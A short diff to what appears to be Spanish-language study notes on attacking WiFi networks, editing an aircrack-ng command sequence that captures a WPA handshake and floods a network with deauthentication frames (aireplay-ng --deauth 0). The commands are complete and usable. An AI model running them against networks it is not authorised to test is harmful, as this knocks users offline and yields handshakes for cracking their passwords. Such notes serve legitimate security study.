@@ -792,8 +792,8 @@ sudo su
 airmon-ng check kill
 airmon-ng start wlp1s0
 airodump-ng wlp1s0
-sudo airodump-ng -w wificapture -c 11 --bssid ... wlp1s0 # wificapture para capturar el handshake
-sudo aireplay-ng --deauth 0 -a BSSID_NETWORK wlp1s0
+sudo airodump-ng -w wificapture -c NUMERO_CANAL --bssid ... wlp1s0 # wificapture para capturar el handshake
+sudo aireplay-ng -D --deauth 0 -a BSSID_NETWORK wlp1s0 # Si no pones el cliente tenes que agregar la opcion -D
 wireshark wificapture-01.cap
 sudo airmon-ng stop wlp1s0 
 ```
